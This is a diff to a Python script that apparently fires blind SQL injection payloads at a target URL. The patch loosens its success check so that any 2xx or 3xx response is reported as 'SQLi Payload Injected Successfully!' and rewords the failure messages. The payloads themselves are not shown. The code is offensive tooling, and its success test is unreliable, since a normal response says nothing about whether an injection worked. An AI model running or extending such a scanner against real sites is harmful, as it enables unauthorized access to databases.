@@ -114,10 +114,11 @@ def main():
              blindsql = requests.post(url + "/" + i)
              code = blindsql.status_code
              print(blindsql)
-             if code == 200:
+             #print(wi + yl + "[!]" + wi + "<Respond Code>" + code)
+             if code >= 200 and not code > 399:
               print(wi + gr + '[+]' + wi + 'SQLi Payload Injected Successfully!')
-             elif code == 400:
-              print(wi + rd + '[-]' + wi + 'Fail.')
+             elif code >= 400:
+              print(wi + rd + '[-]' + wi + 'Failed Attempt.')
            except TypeError:
             print(wi + rd + '[-]' + wi + "Error Occured.")
        else:
@@ -131,3 +132,4 @@ def main():
     #
 
 main()
+       
